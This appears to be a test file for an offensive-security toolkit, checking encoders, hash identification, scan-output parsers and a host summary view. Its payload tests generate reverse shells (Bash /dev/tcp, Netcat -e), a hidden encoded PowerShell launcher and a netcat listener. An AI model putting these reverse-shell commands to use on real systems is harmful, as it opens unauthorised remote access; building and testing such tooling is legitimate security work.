"""Tests for the toolkit, payloads, scan parsers and host-view features."""
from core import payloads, toolkit
from core.hosts import host_overview
from core.parsers import detect_format, parse
from database.models import Finding, Asset


# ------------------------------------------------------------------ toolkit
def test_toolkit_codecs_roundtrip():
    for op in ("Base64", "Base32", "Hex", "URL encoding", "ROT13", "Binary", "ASCII85"):
        enc = toolkit.transform(op, "KaliForge!42", False)
        dec = toolkit.transform(op, enc, True)
        assert dec == "KaliForge!42", op


def test_toolkit_hash_text():
    h = toolkit.hash_text("password")
    assert h["md5"] == "5f4dcc3b5aa765d61d8327deb882cf99"
    assert len(h["sha256"]) == 64


def test_toolkit_identify_hash():
    assert "SHA-256" in [r["name"] for r in toolkit.identify_hash("a" * 64)]
    assert "SHA-1" in [r["name"] for r in toolkit.identify_hash("a" * 40)]
    names32 = [r["name"] for r in toolkit.identify_hash("a" * 32)]
    assert "MD5" in names32 and "NTLM" in names32
    assert toolkit.identify_hash("$2a$12$" + "a" * 53)[0]["name"] == "bcrypt"
    assert "Unknown" in toolkit.identify_hash("nope")[0]["name"]


# ----------------------------------------------------------------- payloads
def test_payload_reverse_shells():
    cmd = payloads.reverse_shell("Bash /dev/tcp", "10.0.0.1", "4444")
    assert "/dev/tcp/10.0.0.1/4444" in cmd
    assert all(name in payloads.REVERSE_SHELLS for name in ("Python3", "PHP", "PowerShell"))


def test_payload_encoders():
    base = payloads.reverse_shell("Netcat -e", "1.2.3.4", "9001")
    assert "%2F" in payloads.url_encode(base) or "%20" in payloads.url_encode(base)
    assert payloads.base64_encode("abc") == "YWJj"
    assert payloads.powershell_encoded("whoami").startswith("powershell -nop -w hidden -enc ")


def test_payload_listener():
    assert payloads.listener("Netcat", "", "4444") == "nc -lvnp 4444"


# ------------------------------------------------------------------ parsers
def test_detect_format():
    assert detect_format("<?xml version='1.0'?><nmaprun>") == "nmap-xml"
    assert detect_format('{"template-id":"x"}') == "nuclei-json"
    assert detect_format("Nmap scan report for host") == "nmap-normal"
    assert detect_format("/admin (Status: 200)") == "gobuster"


def test_parse_nmap_xml():
    xml = ('<?xml version="1.0"?><nmaprun><host><status state="up"/>'
           '<address addr="192.168.56.101" addrtype="ipv4"/>'
           '<hostnames><hostname name="t.local"/></hostnames>'
           '<ports><port protocol="tcp" portid="22"><state state="open"/>'
           '<service name="ssh" product="OpenSSH" version="8.2"/></port>'
           '<port protocol="tcp" portid="80"><state state="closed"/></port>'
           '</ports></host></nmaprun>')
    r = parse(xml)
    assert not r.error
    assert any(a["kind"] == "ip" and a["value"] == "192.168.56.101" for a in r.assets)
    assert any(a["kind"] == "port" and a["value"] == "22/tcp" for a in r.assets)
    # closed port 80 excluded
    assert not any(a.get("value") == "80/tcp" for a in r.assets)
    assert len(r.findings) == 1


def test_parse_nuclei_sets_cve_and_severity():
    nj = ('{"template-id":"CVE-2021-44228","info":{"name":"Log4j",'
          '"severity":"critical","classification":{"cve-id":["CVE-2021-44228"],'
          '"cvss-score":10.0}},"host":"http://10.0.0.9:8080","matched-at":"http://10.0.0.9:8080/"}')
    r = parse(nj)
    assert r.findings[0]["cve"] == "CVE-2021-44228"
    assert r.findings[0]["severity"] == "critical"


def test_parse_gobuster():
    r = parse("/admin (Status: 200) [Size: 10]\n/x (Status: 404) [Size: 0]")
    assert any(a["kind"] == "url" for a in r.assets)
    assert any("admin" in f["title"] for f in r.findings)


def test_parse_result_to_findings():
    r = parse("Nmap scan report for h (10.0.0.1)\n22/tcp open ssh")
    findings = r.to_findings(workspace_id=1)
    assert findings and findings[0].workspace_id == 1
    assert findings[0].source == "nmap"


# ------------------------------------------------------------------- hosts
def test_host_overview(db):
    ws = 1
    db.add_asset(Asset(kind="port", value="22/tcp", parent="10.0.0.5",
                       meta={"service": "ssh"}), ws)
    db.add_asset(Asset(kind="port", value="443/tcp", parent="10.0.0.5",
                       meta={"service": "https"}), ws)
    db.upsert_finding(Finding(title="Weak cipher", severity="medium",
                              host="10.0.0.5", port="443", workspace_id=ws))
    views = host_overview(db, ws)
    assert len(views) == 1
    host = views[0]
    assert host.host == "10.0.0.5"
    assert host.open_ports == 2
    assert len(host.findings) == 1
    assert host.top_severity == "medium"
